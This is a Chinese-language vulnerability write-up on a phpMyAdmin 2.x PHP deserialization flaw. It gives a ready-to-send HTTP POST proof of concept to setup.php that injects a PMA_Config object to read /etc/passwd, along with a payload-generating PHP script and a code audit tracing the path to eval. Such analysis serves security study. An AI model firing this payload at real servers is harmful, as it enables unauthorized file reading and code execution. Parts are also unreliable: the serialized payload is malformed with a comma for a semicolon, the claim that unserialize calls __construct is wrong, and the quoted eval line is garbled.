## phpmyadmin反序列化漏洞（WooYun-2016-199433）

### 1、版本：phpmyadmin 2.x

### 2、poc

    
    
    POST /scripts/setup.php HTTP/1.1  
    Host: 192.168.139.132:8080  
    Accept-Encoding: gzip, deflate  
    Accept: */*  
    Accept-Language: en  
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)  
    Connection: close  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 84  
    ​  
    action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}  
    ​

### 3、序列化函数

    
    
    <?php  
    class PMA_Config{  
      public $source='/etc/passwd';  
    }  
    $a = new PMA_config();  
    $aa = serialize($a);  
    echo $aa;  
    ?>

### 4、漏洞危害

读取任意文件或执行任意代码。

![image-20220323194740211](https://image.3001.net/images/20220411/1649647728_6253a070c5256a4b6faf3.png!small)

### 5、代码审计（原理）

![image-20220323200019526](https://image.3001.net/images/20220411/1649647777_6253a0a1a726f8ba91c7a.png!small)

![image-20220323200006538](https://image.3001.net/images/20220411/1649647800_6253a0b89d22fc043cd35.png!small)

在setup.php中首先new了一个PMA_Config对象，然后将反序列化后的POST数据赋值给$configuration变量。这里可能存在反序列化漏洞，具体效果需要看后续代码。

![image-20220323200143684](https://image.3001.net/images/20220411/1649647823_6253a0cf117694e422260.png!small)

查看PMA_Config类代码块，记住这个变量$source，后续会用到它

![image-20220323200411545](https://image.3001.net/images/20220411/1649647844_6253a0e4e93ea4327af4a.png!small)

在这个类中定义的一个魔术方法，当new一个PMA_Config对象的时候就会先调用该魔术方法，查看魔术方法的代码块，可以看到$this->load($source)这条语句，代码大意为调用本类的load方法，将$source作为参数传入load方法中。

![image-20220411093243003](https://image.3001.net/images/20220411/1649647867_6253a0fb4f8c7677e9338.png!small)

这是load的代码块，首先如果没有传入$source则直接将其赋值为null，若有值则按照实际值传入，接着if语句判断$source!==null,由于我们利用反序列化漏洞的时候，会为$source这个变量赋一个字符串类型的值，经过if语句判断为true会执行$this->setSource($source)语句。

![image-20220411104207296](https://image.3001.net/images/20220411/1649647895_6253a11730d6270d0dcb2.png!small)

查看setSource方法代码块，只是简单去掉传入的参数中的空格，然后继续赋值给本类的$source变量。

继续看load方法代码块，直接执行到

    
    
    eval('?> . file_get_contents($this->getSource())')

继续看getSource方法代码块

![image-20220411104701944](https://image.3001.net/images/20220411/1649647914_6253a12ad8783aca00ecd.png!small)

该方法只是单纯的返回本类的$source的值。

### 6、总结

通过审计没有发现任何对$source进行过滤的函数和操作。而且$source涉及到危险函数的操作，file_get_contents和eval等函数，如果我们可以对$source进行控制，即可造成代码执行，任意文件读取的漏洞。这时我们可以通过上述第3点提供的反序列化函数生成字符流。通过setup.php中的POST['configuration']传入字符串，接着使用unserialize函数将序列化后的字符流还原为对象，还原为对象后就会造成漏洞的产生。

整个流程：

1、我们使用上述序列化函数生成的字符流通过POST传入，被unserialize反序列化成对象

2、字符流一旦被反序列化，即会new一个PMA_Config对象，将直接调用魔术方法__construct()

3、反序列化后的$source='/etc/passwd', setSource()函数是将传入的变量source去空后赋值给本类变量$source

4、接着调用getSource()函数取出本类变量$source 中的值

5、file_get_contents()函数打开文件目录（/etc/passwd）读取内容，eval执行目录（/etc/passwd）中的PHP代码。

